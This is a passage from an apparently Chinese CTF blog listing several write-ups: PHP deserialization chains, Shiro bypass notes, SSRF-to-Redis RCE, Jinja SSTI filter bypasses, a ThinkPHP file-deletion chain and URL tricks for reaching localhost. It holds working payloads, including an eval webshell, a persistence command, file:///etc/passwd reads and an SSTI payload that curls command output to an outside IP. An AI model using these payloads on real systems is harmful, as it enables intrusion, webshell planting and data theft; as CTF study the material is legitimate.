class="keyword">function</span> <span class="title">myGen</span>(<span class="params">$length</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $s = <span class="keyword">$this</span>-&gt;buffer-&gt;read;</span><br><span class="line">            call_user_func(<span class="keyword">$this</span>-&gt;source-&gt;generate, $length);</span><br><span class="line">            <span class="keyword">return</span> $s;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>其中需要说明的是，在每次调用链的时候都要先声明一下所在的命名空间，并且，如果需要调用到其他命名空间的内容的时候，需要使用use,举个例子use Method\Func\GetFile;不然就会报错</p>
<p>有点可惜的是，比赛的时候已经构造出链子了，但是当时没学好命名空间的基本用法，所以就一直打不通哎~</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/09/24/spring-security/">shiro权限验证绕过</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-09-24</time><div class="content"><h2 id="SHIRO介绍"><a href="#SHIRO介绍" class="headerlink" title="SHIRO介绍"></a>SHIRO介绍</h2><p>shiro是一个java安全框架，用于执行身份验证、授权、密码、和会话管理系统，通常，<strong>shiro会和spring等框架一起搭配用于web应用系统的开发</strong></p>
<h3 id="权限验证方式"><a href="#权限验证方式" class="headerlink" title="权限验证方式"></a>权限验证方式</h3><p>shiro是基于url的权限验证，配置的url模式使用ant风格模式，ant路径通过通配符支持”?”、”<em>“、”\</em>*“。<br>对于”?”，其匹配一个字符串。如”/admin?”将匹配”/admin1”、但不匹配”/admin”或者”/admin/“</p>
<p>对于”<em>“,其匹配/admin/abc”，但不匹配/admin/a/b<br>对于”\</em>*“，其匹配路径中的零个或多个路径，如“/admin/**”将匹配“/admin/a”或“/admin/a/b”。</p>
<h3 id="常用的拦截器配置"><a href="#常用的拦截器配置" class="headerlink" title="常用的拦截器配置"></a>常用的拦截器配置</h3><p>anon拦截器表示匿名访问<br>authc拦截器表示需要身份认证过后才能访问<br>拦截器的匹配顺序采取第一次匹配优先的方式，即从头开始第一个匹配的url模式对应的拦截器链</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eg:</span><br><span class="line">Map&lt;String, String&gt; map &#x3D; new LinkedHashMap&lt;&gt;();</span><br><span class="line">map.put(&quot;&#x2F;doLogin&quot;, &quot;anon&quot;);</span><br><span class="line">map.put(&quot;&#x2F;admin&#x2F;*&quot;, &quot;authc&quot;);</span><br><span class="line">map.put(&quot;&#x2F;manage&#x2F;*&quot;, &quot;authc&quot;);</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2020-1957"><a href="#CVE-2020-1957" class="headerlink" title="CVE-2020-1957"></a>CVE-2020-1957</h2></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/09/23/SSRF%E6%89%93%E6%95%B0%E6%8D%AE%E5%BA%93/">SSRF打数据库</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-09-23</time><div class="content"><h1 id="SSRF打redis"><a href="#SSRF打redis" class="headerlink" title="SSRF打redis"></a>SSRF打redis</h1><p>之前学了一下打redis的几种姿势，所以现在来复现一下<br>几个函数学习下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">parse_url()</span><br><span class="line">#解析 URL，返回其组成部分</span><br><span class="line">#要解析的 URL。无效字符将使用 _ 来替换。</span><br><span class="line">eg:</span><br><span class="line">&lt;?php</span><br><span class="line">$url &#x3D; &#39;http:&#x2F;&#x2F;username:password@hostname&#x2F;path?arg&#x3D;value#anchor&#39;;</span><br><span class="line"></span><br><span class="line">print_r(parse_url($url));</span><br><span class="line"></span><br><span class="line">echo parse_url($url, PHP_URL_PATH);</span><br><span class="line">?&gt;</span><br><span class="line">输出:</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [scheme] &#x3D;&gt; http</span><br><span class="line">    [host] &#x3D;&gt; hostname</span><br><span class="line">    [user] &#x3D;&gt; username</span><br><span class="line">    [pass] &#x3D;&gt; password</span><br><span class="line">    [path] &#x3D;&gt; &#x2F;path</span><br><span class="line">    [query] &#x3D;&gt; arg&#x3D;value</span><br><span class="line">    [fragment] &#x3D;&gt; anchor</span><br><span class="line">)</span><br><span class="line">#注意:</span><br><span class="line">parse_url() 是专门用来解析 URL 而不是 URI 的。不过为遵从 PHP 向后兼容的需要有个例外，对 file:&#x2F;&#x2F; 协议允许三个斜线（file:&#x2F;&#x2F;&#x2F;...）。</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gethostbyname — 返回主机名对应的 IPv4地址。</span><br><span class="line">ip2long() — 返回其长整数型的ip</span><br></pre></td></tr></table></figure>

<h2 id="2020网鼎杯SSRF打redis"><a href="#2020网鼎杯SSRF打redis" class="headerlink" title="2020网鼎杯SSRF打redis"></a>2020网鼎杯SSRF打redis</h2><p>再本题中，他给了一个提示：/Please visit hint.php locally.<br>但是他对我们访问本地做了一个waf，防止我们访问到，所以这个时候我们是需要进行绕过的，绕过本地的姿势有很多</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">跳转&#x2F;解析到127.0.0.1：</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1.nip.io&#x2F;hint.php编码绕过：http:&#x2F;&#x2F;0x7f.0.0.1&#x2F;hint.php特殊字符绕过</span><br><span class="line">http:&#x2F;&#x2F;①②⑦.⓪.⓪.①&#x2F;hint.php</span><br><span class="line">http:&#x2F;&#x2F;[0:0:0:0:0:ffff:127.0.0.1]&#x2F;hint.php#这个在这里可以绕过</span><br><span class="line">http:&#x2F;&#x2F;127。0。0。1&#x2F;flag.php</span><br><span class="line">http:&#x2F;&#x2F;127.1&#x2F;flag.php</span><br><span class="line">http:&#x2F;&#x2F;[::]:80&#x2F;flag.php</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1.&#x2F;flag.php</span><br></pre></td></tr></table></figure>

<p>接下来他给了我们关键的源码，解析一下木九十我们需要post一个文件去性进行执行，但是前面有一个exit()需要我们去绕过，这个绕过的方式我记得是用伪协议进行绕过即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span>(<span class="number">1342</span>) <span class="string">&quot; &lt;?php</span></span><br><span class="line"><span class="string">if(<span class="subst">$_SERVER</span>[&#x27;REMOTE_ADDR&#x27;]===&quot;</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">&quot;)&#123;</span></span><br><span class="line"><span class="string">  highlight_file(__FILE__);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">if(isset(<span class="subst">$_POST</span>[&#x27;file&#x27;]))&#123;</span></span><br><span class="line"><span class="string">  file_put_contents(<span class="subst">$_POST</span>[&#x27;file&#x27;],&quot;</span><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&#x27;redispass is root&#x27;</span>;<span class="keyword">exit</span>();<span class="string">&quot;.<span class="subst">$_POST</span>[&#x27;file&#x27;]);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<p>这里提供了redis的密码，又是一个file_put_contents的函数，那就是ssrf打redis了，试了一下用gopher发送请求却没有回显，所以这里还是考虑一下使用主从复制RCE<br>今天配置了很久，决心一定要好好记录一下<br>首先理解一下什么是主从复制rce</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.分清谁是主谁是从</span><br><span class="line">我们要让对面的服务器加载我们服务器上的恶意文件.so，那么我们是主，对面是从</span><br><span class="line">2.如何让对面的服务器加载</span><br><span class="line">首先需要在服务器放上这两个工具，一个是可以执行命令输出payload的工具，一个是开启服务器的工具</span><br><span class="line">3.lhost和rhost</span><br><span class="line">rhost即为从，lhost为主，并且这里的lhost为了能让对面的服务器加载，必须要是vps</span><br></pre></td></tr></table></figure>

<p>接下来就梳理一下整体流程:将exp.so移动到这个目录<br>然后先在本地的ssef-redis脚本文件进行修改一下：</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210924190740.png" alt="img" style="zoom:67%;">
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210924190747.png" alt="img" style="zoom:67%;">
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210924190825.png" alt="img" style="zoom:67%;">

<p>对以上三个地方进行修改，修改完以后，即可输出payload，<br>接下来启动redis服务，然后把payload<strong>再进行一次urlencode</strong>即可开打</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210924191501.png" alt="img" style="zoom:67%;">

<p>如果要反弹shell，就把那个命令改成反弹shell的指令，在服务器上开启监听即可<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210924191705.png" alt="img" style="zoom:67%;"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210924191706.png" alt="img" style="zoom:67%;">

<h2 id="2021天翼杯——easyeval"><a href="#2021天翼杯——easyeval" class="headerlink" title="2021天翼杯——easyeval"></a>2021天翼杯——easyeval</h2><p>一开始是一个反序列化绕过wakeup函数的,但是他有过滤，只识别A和B两个类，所以可以在外面再嵌套一层C，改变对象数目，即可绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $code = <span class="string">&quot;eval(\$_POST[&#x27;a&#x27;]);&quot;</span>;</span><br><span class="line">    <span class="comment">#public $code = &#x27;phpinfo();&#x27;;</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$method,$args</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;yes&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;code;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;a-&gt;a();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> A();</span><br><span class="line">$b=<span class="keyword">new</span> B();</span><br><span class="line">$c=<span class="keyword">new</span> C();</span><br><span class="line">$b-&gt;a=$a;</span><br><span class="line">$c-&gt;c=$b;</span><br><span class="line">$d=serialize($c);</span><br><span class="line"><span class="keyword">echo</span> $d;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>然后就去命令执行，但是发现他phpinfo()中disable_function过滤了很多命令执行的函数=-=完全执行不了，但是看到有个配置文件，redis的配置文件，又发现file_get_contents函数没有被过滤，于是去打了一下6379端口，发现可以打通，所以感觉大概率是ssrf打redis<br>思路大概有以下几种:</p>
<p>1.备份crontab反弹shell<br>2.备份文件写马<br>3.主从复制rce<br>4.写无损文件<br>用蚁剑连接，发现tmp目录下可写文件，于是直接把redis的恶意模块exp.so放进去<br>然后利用蚁剑的redis插件直接进行连接数据库，密码在网站根目录下有写<br><img src="file:///C:\Users\10452\AppData\Roaming\Tencent\Users\1045225639\QQ\WinTemp\RichOle\2403`VG{38DW6{IC@{F@KPG.png" alt="img" style="zoom:67%;"></p>
<p>然后就登录<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210924113822.png" alt="img" style="zoom:67%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210924113839.png" alt="img" style="zoom:67%;"></p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>今天学习的都是SSRF通过主从复制打redis进行rce的，理解完以后发现也没啥难点–，主要是找到一篇看得懂的教程<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/113651337">https://blog.csdn.net/rfrder/article/details/113651337</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/09/22/2021xman%E9%80%89%E6%8B%94%E8%B5%9B/">2021xman选拔赛</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-09-22</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>复现Rctf的比赛，复现到一半发现其他都是不过10解的数，就没在看了，看了一下xman的比赛解出来的人数还挺多，于是就想说去看看</p>
<h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XMAN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class;</span><br><span class="line">    <span class="keyword">public</span> $para;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;Hel&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;xctfer&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;check = <span class="keyword">new</span> Filter;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;para) &amp;&amp; <span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;class)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;what?Really?&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hel</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $a;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$a</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = $a;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;Hello bro, I guess you are a lazy &quot;</span>.<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Filter</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params">$code</span>)</span>&#123;</span><br><span class="line">        $pattern = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match($pattern, $code))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;xctf&#x27;</span>]))&#123;</span><br><span class="line">    unserialize($_GET[<span class="string">&#x27;xctf&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> XMAN;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>自己写个demo复现一下看看，反序列题，却又没给可以命令执行或者读文件的函数，那八成就是考察内置类了，定位了一下，似乎也就是这里了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210922165944.png" alt="img" style="zoom:67%;"></p>
<p>先构造一下链条，看看如何到这里，再去寻找内置类：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class XMAN&#123;</span><br><span class="line">    public $class;</span><br><span class="line">    public $para;</span><br><span class="line">    public $check;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;check &#x3D; new Filter;</span><br><span class="line">        if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) &#123;</span><br><span class="line">            echo new  $this-&gt;class ($this-&gt;para);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">            die(&#39;what?Really?&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class Hel&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class Filter&#123;</span><br><span class="line"></span><br><span class="line">    function vaild($code)&#123;</span><br><span class="line">        $pattern &#x3D; &#39;&#x2F;[!|@|#|$|%|^|&amp;|*|&#x3D;|\&#39;|&quot;|:|;|?]&#x2F;i&#39;;</span><br><span class="line">        if (preg_match($pattern, $code))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">            return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a&#x3D;new XMAN();</span><br><span class="line">$b&#x3D;&#39;SplFileObject&#39;;</span><br><span class="line">$c&#x3D;&#39;flag.txt&#39;;</span><br><span class="line">$a-&gt;class&#x3D;$b;</span><br><span class="line">$a-&gt;para&#x3D;$c;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>

<p>根本就不用咋构造哈哈哈哈=-=，偶尔做做简单题，增强一下自信心</p>
<h2 id="你的名字"><a href="#你的名字" class="headerlink" title="你的名字"></a>你的名字</h2><p>听说这题是原题，发现自己buu这题也还没做，做一下：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210922172943.png" alt="img" style="zoom:67%;"></p>
<p>这不是一看就大概率是模板注入了？测试一下看看是什么模板<br>看起来是过滤了两个中括号，一个中括号是没事的，所以payload直接打<br>这里的过滤规则是这样的，扫描列表并将其替换为空，然后config放在最后一个，那扫到最后一个的时候，将其替换为空，那么语句就会以正确的形式显示了，多收藏几个payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% iconfigf <span class="string">&#x27;&#x27;</span>.__claconfigss__.__mconfigro__[<span class="number">2</span>].__subclasconfigses__()[<span class="number">59</span>].__init__.func_glconfigobals.linecconfigache.oconfigs.popconfigen(<span class="string">&#x27;curl http://110.42.133.120:9999/ -d `ls / | grep flag`;&#x27;</span>) %&#125;<span class="number">1</span>&#123;% endiconfigf %&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%set a=<span class="string">&#x27;__bui&#x27;</span>+<span class="string">&#x27;ltins__&#x27;</span>%&#125;</span><br><span class="line">&#123;%set b=<span class="string">&#x27;__im&#x27;</span>+<span class="string">&#x27;port__&#x27;</span>%&#125;</span><br><span class="line">&#123;%set c=<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>%&#125;</span><br><span class="line">&#123;%set d=<span class="string">&#x27;po&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>%&#125;</span><br><span class="line">&#123;%print(lipsum[<span class="string">&#x27;__globals__&#x27;</span>][a][b](c)[d](<span class="string">&#x27;ls /&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]())%&#125;</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/09/20/ctfshow%E4%B8%AD%E7%A7%8B/">ctfshow中秋</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-09-20</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>中秋节没啥事，看到学长在做这个比赛的题目，也来看看，题目挺简单的，就是第三题没见过，学习一下</p>
<h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><p>0e弱类型</p>
<h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><p>一个典型的控制器类定义如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">namespace app\index\controller;</span><br><span class="line"></span><br><span class="line">class Index </span><br><span class="line">&#123;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        return &#39;index&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>控制器类文件的实际位置是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">application\index\controller\Index.php</span><br></pre></td></tr></table></figure>

<p>当控制器的定义为:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">namespace app\index\controller;</span><br><span class="line"></span><br><span class="line">class Index </span><br><span class="line">&#123;</span><br><span class="line">    public function hello()</span><br><span class="line">    &#123;</span><br><span class="line">        return &#39;hello,world!&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function data()</span><br><span class="line">    &#123;</span><br><span class="line">        return [&#39;name&#39;&#x3D;&gt;&#39;thinkphp&#39;,&#39;status&#39;&#x3D;&gt;1];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么想要访问不同的路由就要:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php&#x2F;index&#x2F;Index&#x2F;hello</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php&#x2F;index&#x2F;Index&#x2F;data</span><br></pre></td></tr></table></figure>

<p>回来看一下源码要访问下面的内容的路由就为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php&#x2F;index&#x2F;index&#x2F;backdoor</span><br></pre></td></tr></table></figure>

<p>访问以后说</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;..&#x2F;..&#x2F;&#39;.&quot;install.lock has not been deleted&quot;; </span><br></pre></td></tr></table></figure>

<p>这个文件存在，无法进行下一步，所以首先要将这个文件删除<br>看了一下源码有一个反序列化，随便输入一个数字，报错发现是tp5.0.24的框架，搜索了一下，有一条链子，但是是任意文件写入的链子，看了一下源码，在入口就有一个unlink函数<br>所以</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;   <span class="keyword">private</span> $files=[];</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = [<span class="string">&#x27;/var/www/html/application/index/controller/../../install.lock&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> Windows()));</span><br></pre></td></tr></table></figure>

<p>链子长这样就行了=-=<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210921182636.png" alt="img"></p>
<p>然后就是post一个cmd参数去拿flag由于最后的flag有个正则匹配，所以要绕过，一般绕过关键字用通配符啥的都行，但是这里外面包裹了单引号，就需要使用不可打印的字符进行绕过了，这点到时候磨了很久，还有个更无语的就是，不知道为啥在网页那边用hackbar发送出去没有flag，而在burp里面才可以<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210921185222.png" alt="img"></p>
<h2 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 题目说明：</span></span><br><span class="line"><span class="comment">// 想办法维持权限，确定无误后提交check，通过check后，才会生成flag，此前flag不存在</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$a=$_GET[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>($a)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;cmd&#x27;</span>:</span><br><span class="line">        <span class="keyword">eval</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;check&#x27;</span>:</span><br><span class="line">        file_get_contents(<span class="string">&quot;http://checker/api/check&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;params not validate&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>不是很懂题目的意思，看了wp以后，推测是让php出在休眠状态不作反应，这样在check的时候权限就维持在原来的状态了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd&#x3D;file_put_contents(&quot;&#x2F;tmp&#x2F;index.php&quot;,&quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;);system(&quot;sleep 5 %26%26 php -S 0.0.0.0:80 -t &#x2F;tmp&#x2F;&quot;);</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/09/19/%E5%85%B3%E4%BA%8Eurl%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8Ftrick/">关于url的一些小trick</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-09-19</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>感觉最近遇到挺多ssrf的题目，然后就遇到了挺多这种url绕过的小trick，所以来复习一下</p>
<p>1.访问路径的后缀被写死时<br>可以使用?a=后缀，或者#进行绕过<br>eg:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">以jpg结尾</span><br><span class="line">http:&#x2F;&#x2F;xxxx?a&#x3D;jpg</span><br><span class="line">此时访问的内容即为?a前面的东西</span><br></pre></td></tr></table></figure>

<p>2.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">requests </span><br><span class="line"></span><br><span class="line">ipv6、ipv6 zone </span><br><span class="line"></span><br><span class="line">requests.get(http:&#x2F;&#x2F;[::FFFF:127.0.0.1]:23334) requests.get(http:&#x2F;&#x2F;[::FFFF:127.0.0.1%abc]:23334)</span><br><span class="line"></span><br><span class="line">host 支持  url  编码，端口号数字扩展位数</span><br><span class="line"></span><br><span class="line">requests.get(http:&#x2F;&#x2F;%61.baidu.com:00080).text</span><br></pre></td></tr></table></figure>

<p>3.python的urllib支持读取任意文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;&#96;python # python3 # </span><br><span class="line">都相当于打开了 (http:&#x2F;&#x2F;a.baidu.com&#x2F;) urllib.request.urlopen(http:&#x2F;&#x2F;[a.baidu.com]).read() </span><br><span class="line">urllib.request.urlopen(&lt;http:&#x2F;&#x2F;[a.baidu.com]&gt;).read() </span><br><span class="line">urllib.request.urlopen(&lt;URL:http:&#x2F;&#x2F;[a.baidu.com]&gt;).read()</span><br><span class="line">urllib.request.urlopen(&#39;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&#39;).read()</span><br><span class="line"># python2 </span><br><span class="line"># 都相当于打开了 [http:&#x2F;&#x2F;a.baidu.com](http:&#x2F;&#x2F;a.baidu.com&#x2F;) </span><br><span class="line">urllib.urlopen(&lt;URL:http:&#x2F;&#x2F;[a.baidu.com]&gt;).read() # 读文件  老东西了 </span><br><span class="line">urllib.urlopen(&#39;local_file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&#39;).read() </span><br><span 